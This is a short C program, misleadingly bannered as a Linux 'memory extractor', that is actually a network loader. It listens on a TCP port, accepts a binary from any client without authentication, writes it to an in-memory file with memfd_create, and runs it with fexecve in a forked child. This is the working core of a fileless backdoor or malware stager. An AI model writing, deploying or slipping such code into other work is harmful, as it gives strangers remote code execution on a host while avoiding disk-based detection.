#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <endian.h>

#define Q_LEN 10
#define P_LEN 2

int main(int argc, char const* argv[]){

  printf("---LINUX MEMORY EXTRACTOR---:\n");

  if (argc < 2) {
    printf("NOT ENOUGH ARGUMENTS\n");
    exit(EXIT_FAILURE);
  }

  struct sockaddr_in address;
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(atoi(argv[1]));

  socklen_t address_size = sizeof(address);

  int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (socket_fd < 0) {
    perror("socket");
    exit(EXIT_FAILURE);
  }

  if (bind(socket_fd, (struct sockaddr*) &address, address_size) < 0) {
    perror("bind");
    exit(EXIT_FAILURE);
  }

  if (listen(socket_fd, Q_LEN) < 0) {
    perror("listen");
    exit(EXIT_FAILURE);
  }

  printf("Waiting for a connection...\n");

  while (1){
    int socket = accept(socket_fd, (struct sockaddr*) &address, &address_size);
    if (socket < 0) {
      perror("accept");
      continue;
    }

    printf("Accepted connection!\n");

    int data_fd = memfd_create("client_data", 0);
    if (data_fd < 0) {
      perror("memfd_create");
      continue;
    }

    int last_packet = 0;
    while (!last_packet){
      unsigned char header_buffer[P_LEN + 1];
      if (read(socket, header_buffer, P_LEN + 1) < 0) {
        perror("read");
        break;
      }

      int data_size = 0;
      for (int i = 0;i < P_LEN;i++) {
        data_size += header_buffer[i] << (8 * i);
      }

      last_packet = header_buffer[P_LEN];

      if(last_packet > 0) {
        last_packet = 1;
      }

      printf("Receiving packet (Length = %d, Last = %d)\n", data_size, last_packet);

      void* data_buffer[data_size];

      if (read(socket, data_buffer, data_size) < 0) {
        perror("read");
        break;
      }

      if (write(data_fd, data_buffer, data_size) < 0) {
        perror("write");
        break;
      }
    }
    
    if (!last_packet) {
      perror("nolastpacket");
      continue;
    }

    printf("EXECUTING\n");

    const char * const data_argv[] = {NULL};
    const char * const data_envp[] = {NULL};

    if (fork() == 0) {
      fexecve(data_fd, (char * const *) data_argv, (char * const *) data_envp);
    }
  }
}